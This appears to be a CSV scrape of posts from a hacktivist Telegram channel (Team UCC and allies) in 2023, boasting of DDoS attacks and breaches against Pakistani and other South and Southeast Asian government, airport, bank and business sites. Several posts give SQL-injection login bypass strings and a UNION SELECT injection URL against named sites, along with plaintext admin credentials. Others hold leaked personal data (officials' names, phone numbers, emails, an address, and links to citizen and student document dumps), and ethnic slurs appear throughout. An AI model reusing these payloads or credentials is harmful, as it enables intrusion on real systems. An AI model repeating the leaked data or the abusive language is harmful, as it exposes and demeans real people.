time,message,message_id,channel_id,search_term,link
2023-04-30 10:12:23+00:00,"SITE :- https://lalajee.pk/admin/home.php#

ID = ' or ' 1=1 limit 1-- +
PASS = ' or ' 1=1 limit 1-- +

FUCK PORKIS 😂😂😂🖕🖕

ODIYAN = ABHISHEK SHARMA LOL 😂😂

#PKMKB
#OPPAYBACK_PK

#ANONYMOUS_INDIA
#UNKNOWN_CYBER_CULT
#TEAM_ANON_101
#TEAM_UCC
#TEAM_ICP

⚜♤ @UCC_TEAM ♤⚜",2667,1756441965,.pk,https://t.me/c/1756441965/2667
2023-04-30 09:12:28+00:00,"Site :- http://www.wordsmith.com.pk/
Admin Email :- aye.sajid@gmail.com

Other Details In File !!

⚜️♤ @UCC_TEAM ♤⚜️",2665,1756441965,.pk,https://t.me/c/1756441965/2665
2023-04-30 09:12:18+00:00,"http://www.wordsmith.com.pk/

⚜️♤ @UCC_TEAM ♤⚜️",2664,1756441965,.pk,https://t.me/c/1756441965/2664
2023-04-30 09:03:01+00:00,"Site -> https://longlife.com.pk/
admin url  -> ( Not Found )
Admin Email -> ali@longlife.com.pk
Admin Pass -> SSredSun@123
Admin Contact -> +92-52-3562932-1
Bsdk Wale ka Address -> Rawail Garh, Fateh Garh Agency, Defence Road Sialkot 51310, Pakistan

⚜♤ @UCC_TEAM ♤⚜",2663,1756441965,.pk,https://t.me/c/1756441965/2663
2023-04-29 02:03:50+00:00,"Drug Regulatory Authority of Pakistan Mail Server Hacked By Team UCC & ANON_SEC_101

We Are In Your Servers 😂😂

Data Sample -> https://anonfiles.com/R6n8Ocnbz2/PIRIMS_Template_Lawari_International_2_xlsx

#PKKMKB
#OPPAYBACK_PK

#ANONYMOUS_INDIA
#UNKNOWN_CYBER_CULT
#TEAM_ANON_101
#TEAM_UCC
#TEAM_ICP

⚜♤ @UCC_TEAM ♤⚜",2644,1756441965,.pk,https://t.me/c/1756441965/2644
2023-04-27 15:18:58+00:00,"IS ITS FAKE PORKIS 😂😂🖕🖕🖕😂😂😂

PAK GOV MAIL IS SAFE 👍👍

#OPPAYBACK_PK
#OPPAKISTAN
#PKMKB

#TEAM_UCC
#TEAM_ANON_101
#Indian_cyberpunk
#AnonymousIndia
#UnknownCyberCult

⚜️♤ @UCC_TEAM ♤⚜️",2631,1756441965,.pk,https://t.me/c/1756441965/2631
2023-04-27 10:18:34+00:00,"PAK GOV MAIL IS SAFE🤡 👍👍

#OPPAYBACK_PK
#OPPAKISTAN
#PKMKB

#TEAM_UCC
#TEAM_ANON_101
#Indian_cyberpunk
#AnonymousIndia
#UnknownCyberCult

✦ @ANONYMOUS_INDIA_101 ✦",2630,1756441965,.pk,https://t.me/c/1756441965/2630
2023-04-21 16:33:05+00:00,"PAKISTAN SHOPPING SITE HACKED 

Site :- http://shoppingz.pk

#OPPAYBACK_MY
#OPMALAYSIA
#OP_MY
#OPHABIBI

#TEAM_ANON_101
#IndianCyberForce
#Indian_cyberpunk
#DarknetAssociation
#KeralaCyberXtractor
#NewWorldHactivist
#IndianCyberMafia
#BlackDragonSecurity
#IndianCyberTroops
#AnonymousIndia
#IndianCyberPwnage
#UnknownCyberCult

✦ @ANONYMOUS_INDIA_101 ✦",2602,1756441965,.pk,https://t.me/c/1756441965/2602
2023-04-20 14:10:52+00:00,"Pakistan Website Hacked 

https://persontage.com.pk/

#OPPAYBACK_PK
#OPPK
#PKMKB


#TEAM_ANON_101
#IndianCyberForce
#Indian_cyberpunk
#DarknetAssociation
#KeralaCyberXtractor
#NewWorldHactivist
#IndianCyberMafia
#BlackDragonSecurity
#IndianCyberTroops
#AnonymousIndia
#IndianCyberPwnage
#UnknownCyberCult

✦ @ANONYMOUS_INDIA_101 ✦",2581,1756441965,.pk,https://t.me/c/1756441965/2581
2023-04-19 16:43:58+00:00,"Online Freelance Marketplace Of Pakistan Is Hacked

#OPPAYBACK_PK
#OPPK
#PKMKB


#TEAM_ANON_101
#IndianCyberForce
#DarknetAssociation
#KeralaCyberXtractor
#NewWorldHactivist
#IndianCyberMafia
#BlackDragonSecurity
#IndianCyberTroops
#AnonymousIndia
#IndianCyberPwnage
#UnknownCyberCult

✦ @ANONYMOUS_INDIA_101 ✦",2578,1756441965,.pk,https://t.me/c/1756441965/2578
2023-04-18 18:04:18+00:00,"MALAYSIAN HACKERS DONT INTERFERE
IN OUR CYBER WAR

IF U WANT TO STOP THIS THEN TELL TO INDONESIAN HACKERS 


#OPPAYBACK_ID
#OPPAYBACK_PK

#TEAM_ANON_101
#TEAM_UCC
#TEAM_ICP

✦ @ANONYMOUS_INDIA_101 ✦",2571,1756441965,.pk,https://t.me/c/1756441965/2571
2023-04-18 14:13:16+00:00,"1 MILLION + CITIZEN DATA OF INDONESIA 

ANONFILE LINK : https://anonfiles.com/h9X7e5mdz6/1M_CITIZENS_DATA_OF_INDONESIA_rar

NOTICE : HELLO INDO STOP TARGETING INDIAN PVT SITES IF U DON'T STOP THEN READY TO FU*K

#OPPAYBACK_ID
#OPPAYBACK_PK

#TEAM_ANON_101
#TEAM_UCC
#TEAM_ICP

✦ @ANONYMOUS_INDIA_101 ✦",2567,1756441965,.pk,https://t.me/c/1756441965/2567
2023-04-17 12:35:44+00:00,"HELLO INDONESIA WE ARE IN MEDAN UNIVERSITIES SITES 

LEAKING MORE ......

ANONFILE LINK :
https://anonfiles.com/Tcv0R4ldz3/Medan_Indonesia_Data_zip

IF ITS DORKING THEN ITS ENOUGH FOR U BARKING DOGS 🤡


#OPPAYBACK_ID
#OPPAYBACK_PK

#TEAM_ANON_101
#TEAM_UCC
#TEAM_ICP",2559,1756441965,.pk,https://t.me/c/1756441965/2559
2023-04-17 12:18:38+00:00,"HELLO INDONESIA WE ARE IN MEDAN UNIVERSITIES SITES 

LEAKING MORE ......

ANONFILES :
https://anonfiles.com/p0H9Mflbz0/KTP_pdf
https://anonfiles.com/q1HcM1laz7/Transkrip_Nilai_S1_pdf
https://anonfiles.com/s7H1Mel8z2/Kartu_Keluarga_pdf
https://anonfiles.com/ufH9M3leze/Transkip_Nilai_S2_pdf
https://anonfiles.com/y7H5Mfl8zf/Transkip_Nilai_S1_pdf
https://anonfiles.com/2eH1M0l3z8/Transkip_Nilai_S1_2_pdf
https://anonfiles.com/08HbMel0za/Ijazah_S2_pdf
https://anonfiles.com/42HbM9lbz2/Ijazah_S1_pdf

#OPPAYBACK_ID
#OPPAYBACK_PK

#TEAM_ANON_101
#TEAM_UCC
#TEAM_ICP",2556,1756441965,.pk,https://t.me/c/1756441965/2556
2023-04-16 05:21:57+00:00,"ARE U READY? MEDAN😂

#OPPAYBACK_PK 
#TEAM_UCC
#TEAM_ICP

⚜♤ @UCC_TEAM ♤⚜",2536,1756441965,.pk,https://t.me/c/1756441965/2536
2023-04-16 05:08:15+00:00,"#OPPAYBACK_PK 
#TEAM_UCC 
#TEAM_ICP 

⚜♤ @UCC_TEAM ♤⚜",2533,1756441965,.pk,https://t.me/c/1756441965/2533
2023-04-16 05:07:29+00:00,"#OPPAYBACK_PK 
#TEAM_UCC 
#TEAM_ICP 

⚜♤ @UCC_TEAM ♤⚜",2532,1756441965,.pk,https://t.me/c/1756441965/2532
2023-04-16 05:05:22+00:00,"http://dcbuner.kp.gov.pk

#OPPAYBACK_PK 
#TEAM_UCC 
#TEAM_ICP 

⚜♤ @UCC_TEAM ♤⚜",2531,1756441965,.pk,https://t.me/c/1756441965/2531
2023-04-16 05:04:41+00:00,"http://dcbuner.kp.gov.pk

Details Like :- Sabit Shah  Agriculture Extension  Agri: Super:  0939510315  3429641942  939510315  adalatkhan23@gmail.com  Provincial    Active  Update
sad  as  ads  8094678347  9743806704  9885467936  


#OPPAYBACK_PK 
#TEAM_UCC 
#TEAM_ICP 

⚜♤ @UCC_TEAM ♤⚜",2530,1756441965,.pk,https://t.me/c/1756441965/2530
2023-04-16 05:03:16+00:00,"Meeting Record of http://dcbuner.kp.gov.pk

Date Meeting Alert Contact Number Time Action
2022-05-22 workin 923339841487 2022-05-28 00:54:47.926629 
2022-05-24 testing 923339841487 2022-05-28 00:55:10.691478 
2022-05-31 test 3339841487 2022-05-31 14:24:32.135253 
2022-05-31 test 03339841487 2022-05-31 14:26:05.665765 
2022-06-13 Performance is scheduled to be held on lsdkjalksjdlasdddddddddddddddddddddddd 923444279833 2022-06-13 13:14:23.609627

#OPPAYBACK_PK 
#TEAM_UCC 
#TEAM_ICP 

⚜♤ @UCC_TEAM ♤⚜",2529,1756441965,.pk,https://t.me/c/1756441965/2529
2023-04-16 05:02:34+00:00,"DSR Record of dcbuner.kp.gov.pk

Date Time Tehsil Murder/ Death/ Suicide Accident Rain Flood 3MPO theft Miscellaneous Visits Shops Inspected Shops Fined Fine Imposed Meeting ADP Visits Miscellaneous Gathering VIP Visits Any Significant Issue Action
2022-06-28 2022-06-28 14:13:45 Mandanr Nil Nil Nil Nil Nil Nil 1 0 0 0 Nil Nil Nil Nil Nil Loadsheeding 
2022-06-29 2022-06-29 13:56:49 Mandanr Nil Nil Nil Nil Nil Nil visited GHS Kawga and BHU Kawga 15 1 500 Nil Nil Nil Nil Nil Loadsheeding 
2022-06-29 2022-06-29 14:00:38 Daggar Nil School Bus at Mouza  Bagra was trapped but rescued by Rescue 1122 on time. No casualty reported. Nil Nil Nil Nil Nil 18 1 2000 Nil Nil Nil Nil Nil Nil 
2022-06-30 2022-06-30 15:11:06 Daggar Nil Accident Occurred between Truck and Motor Cycle at Mouza Torwarsak, due to which one Mr.Rahim Zada S/O Sher Zada R/O Anghapur get injured, who was rushed to DHQ Hospital Daggar for treatment. Nil Nil Nil Nil Nil 22 0 0 Nil 0 Inspection of SDC Daggar Nil Nil Nil 
2022-07-05 2022-07-05 12:31:28 Mandanr Nil Nil Nil Nil Nil Nil Visited CH Chamla and Patwarkhana Nawagai 15 1 400 nil Inspected under construction SDC Mandanr along with project manager land computerization Buner Nil Nil Nil Nil 
2022-07-21 2022-07-21 13:47:02 Daggar NIL NIL NIL NIL NIL NIL NIL 15 1 500 NIL NIL Today Government Subsidized Atta were distributed amongst the peoples at Daggar. NIL Today Honorable Chief Justice Peshawar High Court Mr. Qaisar Rashid and Worthy Commissioner Malakand Division Mr. Shaukat Yousafzai visited District Buner. They inaugurated the bachelor hostel in the Judicial Complex Daggar Buner for judges and also inaugurated a Judicial Block on the name of late Judge Mr. Seemab Siddiqui. NIL 
2022-08-15 2022-08-15 15:01:04 Daggar 02 Deaths 2. Yesterday night on 14th Aug 2022 at Mouza Krapa, one Mr. Rahmani Gul S/O Ali Gohar age 55 years approximately was reported died on the spot after falling from a hill called Sangar. 1. Yesterday night on 14th Aug 2022 at Halqa Gokand Mouza Bar Gokand house of one Mr. Anwar Zeb R/O Bar Gokand collapsed due to recent heavy rain. Resultantly One Ayaz S/O Bakht Zeb age 04 years was reported died on spot while Awais S/O Anwar Zeb R/O Bar Gokand Daggar Buner was reported injured, who was rushed to DHQ Hospital Daggar for treatment. Nil Nil Nil Nil 16 0 0 Nil Nil Nil Nil Nil Nil 
2022-08-16 2022-08-16 14:38:40 Daggar 0 0 1. Yesterday night on 15th Aug 2022 at Mouza Banda one room in house of one Mr. Wazir S/O Sherin  R/O Banda Tehsil Daggar Buner collapsed due to recent heavy rain.   2. Yesterday night on 15th Aug 2022 at Mouza Banda, roof of cattle shed of one Mr. Master Khan S/O Amiry R/O Banda Tehsil Daggar Buner has been collapsed due to recent rains. 0 0 today on 16th Aug 2022 at 09:00AM a protest has been reported at Main Road DHQ Hospital Daggar due to strike of Doctors and all paramedical staff of DHQ Hospital Daggar and closure of OPD at DHQ Hospital Daggar Buner. Later on Additional Assistant Commissioner Daggar and DSP Head Quarter reached the spot and negotiated with the hospital staff, based on which the road was opened for traffic. 0 0 0 0 Nil Nil Nil Nil Nil Nil

#OPPAYBACK_PK
#TEAM_UCC
#TEAM_ICP

⚜♤ @UCC_TEAM ♤⚜",2528,1756441965,.pk,https://t.me/c/1756441965/2528
2023-04-15 15:55:13+00:00,"TARGET 🎯💯

🖕🖕🖕#OPAYBACK_PK🖕🖕🖕

#TEAM_UCC
#TEAM_ICP

⚜♤ @UCC_TEAM ♤⚜",2523,1756441965,.pk,https://t.me/c/1756441965/2523
2023-04-15 14:46:00+00:00,"Noor Zahir Ali Shah  Agriculture Extension  Senior Clerk  0939510315  923329695857  939510315  adalatkhan23@gmail.com  Provincial    Active  Update

SAMPLE OF PAK GOV DATA WEBSITE 🖕🖕🖕

#oppayback_pk

⚜♤ @UCC_TEAM ♤⚜",2519,1756441965,.pk,https://t.me/c/1756441965/2519
2023-04-14 17:04:56+00:00,"RADIO PAKISTAN Gov Site Of Porkis Taken Down By Team UCC & ICP

https://www.radio.gov.pk/
https://check-host.net/check-report/f8e15bck460

#OPPAYBACK_PK

#TEAM_UCC
#TEAM_ICP

⚜️♤ @UCC_TEAM ♤⚜️",2514,1756441965,.pk,https://t.me/c/1756441965/2514
2023-04-13 19:31:08+00:00,"Haidermota & Co. Taken Down By Team UCC & ICP

https://www.hmco.com.pk/
https://check-host.net/check-report/f8b73edkcc1

#OPPAYBACK_PK

#TEAM_UCC
#TEAM_ICP

⚜️♤ @UCC_TEAM ♤⚜️",2513,1756441965,.pk,https://t.me/c/1756441965/2513
2023-04-13 19:22:56+00:00,"PORKIS DATA FUCKED FULL GOV RECORDS

ITS JUST A SAMPLE PORKIS 

#OPPAYBACK_PK

#TEAM_UCC
#TEAM_ICP

⚜️♤ @UCC_TEAM ♤⚜️",2512,1756441965,.pk,https://t.me/c/1756441965/2512
2023-04-09 15:12:24+00:00,"OFFICIAL GOV SITES OF PAK TAKEN DOWN BY TEAM UCC

http://punjab.gov.pk/

https://check-host.net/check-report/f7f941ckf55

OPERATION = #OPPAYBACK_PK

#TEAM_UCC
#TEAM_ICP

⚜♤ @UCC_TEAM ♤⚜",2482,1756441965,.pk,https://t.me/c/1756441965/2482
2023-04-09 14:55:58+00:00,"Agricultural Market Information System Taken Down By Team UCC

SITE : http://www.amis.pk/
CHECK HOST : https://check-host.net/check-report/f7f8b4dke5f

OPERATION = #OPPAYBACK_PK

#TEAM_UCC
#TEAM_ICP

⚜♤ @UCC_TEAM ♤⚜",2481,1756441965,.pk,https://t.me/c/1756441965/2481
2023-04-09 14:00:40+00:00,"Mutual Funds Association of Pakistan Taken Down By Team UCC

SITE : https://www.mufap.com.pk/
CHECK : https://check-host.net/check-report/f7f6c0bk31d

OPERATION = #OPPAYBACK_PK

#TEAM_UCC
#TEAM_ICP

⚜♤ @UCC_TEAM ♤⚜",2480,1756441965,.pk,https://t.me/c/1756441965/2480
2023-04-09 07:01:32+00:00,"#Team_Insane_PK Owner Pic😂

Mr. Insane Randi Ki Bachaa 😂🤣

⚜️♤ @UCC_TEAM ♤⚜️",2474,1756441965,.pk,https://t.me/c/1756441965/2474
2023-04-09 05:50:39+00:00,"MINISTRY OF INFORMATION TECHNOLOGY OF PAKISTAN TAKEN DOWN BY TEAM UCC

https://moitt.gov.pk/
https://www.isitdownrightnow.com/moitt.gov.pk.html
https://check-host.net/check-report/f7e76d1k74f

OPERATION = #OPPAYBACK_PK

#TEAM_UCC
#TEAm_ICP

⚜♤ @UCC_TEAM ♤⚜",2471,1756441965,.pk,https://t.me/c/1756441965/2471
2023-04-08 09:23:22+00:00,"HAHA PAKISTAN U NEED TO ALSO REMEMBER THIS

PORKIS KIDS FACES

ATTACK BY TEAM UCC & ICP

OPERATION = #OPPAYBACK_PK

#TEAM_UCC
#TEAM_ICP

⚜️♤ @UCC_TEAM ♤⚜️",2455,1756441965,.pk,https://t.me/c/1756441965/2455
2023-04-08 09:17:03+00:00,"Pakistan Dairy Development Center Taken Down By Team Ucc & Icp

TAKE THIS PORKIS 

https://pddc.com.pk/

https://check-host.net/check-report/f7c120bk980

⚜♤ @UCC_TEAM ♤⚜",2453,1756441965,.pk,https://t.me/c/1756441965/2453
2023-04-08 09:02:29+00:00,"NBP GANDU PORKIS

PAKISTAN WALE INTERFARE KRTE KHUD SE JHAAT KUCH HOTA NHI OR HAMARE OPERATION ME INTERFARE KRTE LODU 

DDOS AATA BS PORKIS KO HAHA 😂😂🖕🖕🖕🖕🖕🖕

⚜️♤ @UCC_TEAM ♤⚜️",2452,1756441965,.pk,https://t.me/c/1756441965/2452
2023-04-08 09:00:55+00:00,"Target: http://www.nbp.com.pk/
Administrator Login Url : https://www.nbp.com.pk/login/index.aspx 
IP Address: 206.217.195.178
Hostname: protected.by.blockdos.net
Continent: North America (NA)
Country: United States
Capital: Washington
State: Utah
City: Providence
Postal: 84332
Area: 435
ISP:  Hosting Services
Organization: Hosting Services
Time zone: America/Phoenix
IP Language: English

⚜♤ @UCC_TEAM ♤⚜",2450,1756441965,.pk,https://t.me/c/1756441965/2450
2023-04-06 05:28:44+00:00,"SITE- https://na.gov.pk/

CHECK HOST- https://check-host.net/check-report/f760c40k161

WE STOPPED BUT YOU STARTED GUESS THIS WONT END

⚜♤ @UCC_TEAM ♤⚜",2374,1756441965,.pk,https://t.me/c/1756441965/2374
2023-04-05 16:58:29+00:00,,2371,1756441965,.pk,https://t.me/c/1756441965/2371
2023-04-03 15:18:21+00:00,"Pakistan Space Agency SUPARCO              https://suparco.gov.pk/                                                     https://check-host.net/check-report/f6ee790k2f2
Ministry Of Railway Of Pakistan  https://www.railways.gov.pk/ 
https://check-host.net/check-report/f6ee402kd0a 
Ministry of Energy (Power Division)                      https://power.gov.pk/
https://check-host.net/check-report/f6eec31k99e
MINISTRY OF NATIONAL HEALTH SERVICES https://nhsrc.gov.pk/
https://check-host.net/check-report/f6ef6e9k12b
Ministry Of Defence Pakistan https://mod.gov.pk/
https://check-host.net/check-report/f6ef85fke3

⚜♤ @UCC_TEAM ♤⚜",2337,1756441965,.pk,https://t.me/c/1756441965/2337
2023-04-03 11:12:33+00:00,"SITE OF PAKISTAN  ( TEST YOUR SKILLS BEFOR3 KIDS PATCH IT )

http://www.native.edu.pk/detail.php?ComCatID=-32+UNION+SELECT+1,2,3,4,5-- -

ADMIN DETAILS :

USER :- nauman
PASS :- nauman
EMAIL :- info@webworx.com.pk

OPERATION = #OPPAYBACK_BD*""*

#TEAM_UCC

⚜♤ @UCC_TEAM ♤⚜",2332,1756441965,.pk,https://t.me/c/1756441965/2332
2023-04-02 08:13:06+00:00,"Pakistan Payment gateway Taken Down   https://www.jazzcash.com.pk                                        https://check-host.net/check-report/f6c2351k286
https://paypro.com.pk/                                                           https://check-host.net/check-report/f6c1266k32c
https://1link.net.pk/paypak/                                                    https://check-host.net/check-report/f6c221dk881             https://www.gopayfast.com/
https://check-host.net/check-report/f6c22c3k9e3

TEAM UCC

⚜️♤ @UCC_TEAM ♤⚜️",2308,1756441965,.pk,https://t.me/c/1756441965/2308
2023-04-02 04:51:01+00:00,"Pakistan International Airlines Taken Down By Team Ucc

https://www.piac.com.pk/
https://check-host.net/check-report/f6c1372k996

NEVER MESS WITH INDIANS;)

⚜♤ @UCC_TEAM ♤⚜",2305,1756441965,.pk,https://t.me/c/1756441965/2305
2023-04-01 16:23:10+00:00,"User Informatio -> profile_id,username,first_name,last_name,email,url,description ,twitter,facebook,google_plus,linkedin,flickr,youtube,vimeo,skype,xing etc..

DATABASE BY TEAM UCC

OPERATION = #OPPAYBACK_PK

#TEAM_UCC
#TEAM_ICP

⚜️♤ @UCC_TEAM ♤⚜️",2299,1756441965,.pk,https://t.me/c/1756441965/2299
2023-04-01 16:22:56+00:00,"http://www.wordsmith.com.pk/

#TEAM_UCC
#TEAM_ICP

⚜♤ @UCC_TEAM ♤⚜",2298,1756441965,.pk,https://t.me/c/1756441965/2298
2023-04-01 02:39:49+00:00,"https://pakistan.gov.pk/

https://check-host.net/check-report/f684da7k87c

https://kemlu.go.id

https://check-host.net/check-report/f684a61k92

https://bangladesh.gov.bd/index.php

https://check-host.net/check-report/f68473ek6b7

DDOSED THIS IS JUST A GLIMPSE OF WHAT WE CAN DO OR THAT WILL BE DOWN WHOLE DAY

⚜♤ @UCC_TEAM ♤⚜",2290,1756441965,.pk,https://t.me/c/1756441965/2290
2023-03-30 11:27:05+00:00,"BANGLADESH FUCKED BY TEAM UCC & ICP 

UNKNOWN CYBER CULT & INDIAN CYBER CULT 

https://odms.napd.ac.bd/
https://www.bjdcm.edu.bd/
https://tandths.edu.bd/
http://www.dharmopurajc.edu.bd/history.php
https://odms.napd.ac.bd

PAK FUCKED

http://ple.com.pk/
https://apexuniversal.com.pk/icp/


OPERATION = #OPPAYBACK_BD

#TEAM_UCC
#TEAM_ICP

⚜️♤ @UCC_TEAM ♤⚜️",2248,1756441965,.pk,https://t.me/c/1756441965/2248
2023-03-30 08:33:24+00:00,"HAHA PAKISTAN U ALSO NEED TO REMEMBER 30TH MARCH 2023 #CYBERATTACK

ATTACK BY TEAM UCC & ICP

OPERATION = #OPPAYBACK_PK

#TEAM_UCC
#TEAM_ICP

⚜♤ @UCC_TEAM ♤⚜",2228,1756441965,.pk,https://t.me/c/1756441965/2228
2023-03-30 07:11:55+00:00,"PAKISTAN GOV SITES UNDER CONTROL IN TEAM UCC  #CYBERATTACK

MANY DATA AVAILABLE WOOPz Xd😂

ATTACK BY TEAM UCC & ICP

OPERATION = #OPPAYBACK_PK

#TEAM_UCC
#TEAM_ICP

⚜️♤ @UCC_TEAM ♤⚜️",2227,1756441965,.pk,https://t.me/c/1756441965/2227
2023-03-30 06:44:33+00:00,"SITE- https://www.karachiairport.com.pk/

SSL REMOVED Xd PAKISTAN OFFICIAL WEBSITE TAKEN DOWN 

#PORKIS_OFFICIAL

#TEAM_UCC
#TEAM_ICP

⚜♤ @UCC_TEAM ♤⚜",2222,1756441965,.pk,https://t.me/c/1756441965/2222
2023-03-30 06:07:00+00:00,"Poor pk 🤣😂

⚜♤ @UCC_TEAM ♤⚜",2220,1756441965,.pk,https://t.me/c/1756441965/2220
2023-03-30 05:53:18+00:00,"ıllıll • TeAm UcC OpErAtIoNs • ıllıll:
https://www.fpsc.gov.pk/sites/default/files/F.4-77-2021-R-13-03-2023-FS.pdf


https://download1.fbr.gov.pk/SROs/2022711173319584SRO966(I)2022.pdf


Lul Security Pk Gov

⚜♤ @UCC_TEAM ♤⚜",2218,1756441965,.pk,https://t.me/c/1756441965/2218
2023-03-30 05:26:23+00:00,"TOP PAKISTAN AIRPORTS ✈️DDOSED NO FLIGHTS TODAY 😂

SITE- https://www.karachiairport.com.pk/

CHECK HOST - 
https://check-host.net/check-report/f5f6567kfd2

SITE- https://islamabadairport.com.pk

CHECK HOST - https://check-host.net/check-report/f5f976ckbda

SITE - https://www.sial.com.pk/

CHECK HOST- https://check-host.net/check-report/f5fb506kcf8

⚜️♤ @UCC_TEAM ♤⚜️",2211,1756441965,.pk,https://t.me/c/1756441965/2211
2023-03-30 04:49:14+00:00,"TOP PAKISTAN AIRPORTS ✈️DDOSED NO FLIGHTS TODAY 😂

SITE- https://www.karachiairport.com.pk/

CHECK HOST - 
https://check-host.net/check-report/f5f6567kfd2

SITE- https://islamabadairport.com.pk

CHECK HOST - https://check-host.net/check-report/f5f976ckbda

⚜♤ @UCC_TEAM ♤⚜",2210,1756441965,.pk,https://t.me/c/1756441965/2210
2023-03-30 03:08:28+00:00,"RAM NAVAMI SPECIAL

KARACHI AIRPORT DOWN #FUCKpK

SITE- https://www.karachiairport.com.pk/

CHECK HOST- https://check-host.net/check-report/f5f5a64k1da",2206,1756441965,.pk,https://t.me/c/1756441965/2206
2023-03-29 07:18:52+00:00,"WHY I AM WAITING FOR YOUR BIG ATTACK😂 BUT U DEFACE 3 GRADE SITES AND DELETE ADMIN PANEL AND UPLOAD 1 BY 1 LOL 😂😂😂😂😂😂

WE CAN'T STOP OPERATION

FOR U KIDS
https://dohe.mohe.gov.my/
https://nmrr.gov.my/

KAL 30 TARIK H CHUDAI HOGI ACHE SE MY,PK,ID,BD,YE

OPERATION  = #OPPAYBACK_MY && ID

#TEAM_UCC
#TEAM_ICP

⚜️♤ @UCC_TEAM ♤⚜️",2185,1756441965,.pk,https://t.me/c/1756441965/2185
2023-03-28 14:45:02+00:00,"https://www.pbc.org.pk/


https://check-host.net/check-report/f5872cfk143

PAKISTAN BUSINESS SITE 
WE ARE NOT SKIDS TO DDOS HTTP SITES ONLY WE DDOS LAYER7 HTTPS🍷 🗿

⚜♤ @UCC_TEAM ♤⚜",2171,1756441965,.pk,https://t.me/c/1756441965/2171
